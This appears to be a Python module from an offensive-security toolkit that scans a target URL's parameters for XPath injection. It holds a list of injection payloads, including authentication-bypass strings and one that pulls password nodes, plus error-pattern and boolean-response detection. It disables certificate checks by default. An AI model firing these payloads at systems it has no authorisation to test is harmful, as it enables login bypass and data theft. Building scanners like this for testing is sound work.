# modules/vuln_scanner/xpath_injection.py

"""
XPath Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects XPath injection vulnerabilities in XML/XPath
queries through parameter manipulation.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class XPathInjectionScanner:
    """
    XPath injection vulnerability scanner.
    
    Tests for XPath injection using XPath-specific
    payloads and error pattern detection.
    """
    
    XPATH_PAYLOADS = [
        "' or '1'='1",
        "' or ''='",
        "' or 1=1 or ''='",
        "admin' or '1'='1",
        "'] | //user/*[1] | //password['",
        "' and '1'='1",
        "' and '1'='2",
        "' or true() or '",
        "' or false() or '",
        "1' or '1'='1",
    ]
    
    XPATH_ERROR_PATTERNS = [
        r'XPath',
        r'xpath_exception',
        r'SimpleXMLElement',
        r'DOMXPath',
        r'xpath\s+error',
        r'XPathException',
        r'System\.Xml\.XPath',
        r'javax\.xml\.xpath',
        r'org\.apache\.xpath',
        r'selectSingleNode',
        r'selectNodes',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the XPath injection scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for XPath injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.XPATH_PAYLOADS[:5]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            params[parameter] = payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                for pattern in self.XPATH_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'error_matched': pattern,
                            'type': 'error_based',
                        }
                
                if "' or '1'='1" in payload or "' or 1=1" in payload:
                    false_payload = "' and '1'='2"
                    false_params = params.copy()
                    false_params[parameter] = false_payload
                    false_url = base_url + '?' + urlencode(false_params)
                    
                    false_response = self.session.get(false_url, timeout=self.timeout, verify=self.verify_ssl)
                    
                    if len(response.content) != len(false_response.content):
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'type': 'boolean_based',
                            'true_length': len(response.content),
                            'false_length': len(false_response.content),
                        }
                    
            except RequestException:
                continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run XPath injection scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'XPath Injection',
                'severity': 'high',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"XPath injection detected in parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Use parameterized XPath queries. Sanitize user input. Avoid dynamic XPath construction.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }